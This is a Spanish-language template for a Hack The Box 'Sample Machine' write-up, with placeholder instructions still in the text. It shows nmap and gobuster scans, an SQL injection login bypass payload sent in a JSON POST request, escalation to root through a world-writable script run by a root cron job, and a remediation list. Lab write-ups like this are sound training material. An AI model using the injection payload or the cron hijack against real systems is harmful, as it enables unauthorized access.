HTB — Sample Machine

📅 12 Oct 2025 · ⏱️ 8 min de lectura · 🎯 Dificultad: Easy
HTBLinuxWebPrivEsc

Breve introducción a la máquina: qué es, por qué la elegí y qué se aprende. Mantén este resumen en 2–3 frases para enganchar al lector.

Reconocimiento

Comencé con un escaneo de puertos completo con Nmap:

nmap -sC -sV -p- -T4 10.10.10.10 -oN nmap/initial.txt

Resultado relevante:

22/tcp  open  ssh     OpenSSH 8.2
80/tcp  open  http    nginx 1.18.0

Enumeración Web

El servicio web en el puerto 80 expone un panel de login. Fuzzing de directorios:

gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt

Hallazgo: el endpoint /api/v1/users responde sin autenticación y filtra emails.

Explotación

Detalla el vector: payloads, request HTTP, captura en Burp, etc.

POST /login HTTP/1.1
Host: target
Content-Type: application/json

{"user":"admin","pass":"' OR 1=1--"}

Escalada de privilegios

Una vez con shell de bajo privilegio, encontré un cron ejecutando un script con permisos débiles:

* * * * * root /opt/backup.sh

El script era escribible por cualquier usuario → reverse shell como root.

Remediación

  • Restringir permisos de scripts ejecutados por root (chmod 700, chown root:root).
  • Validar autenticación en todos los endpoints de la API.
  • Parametrizar consultas SQL.
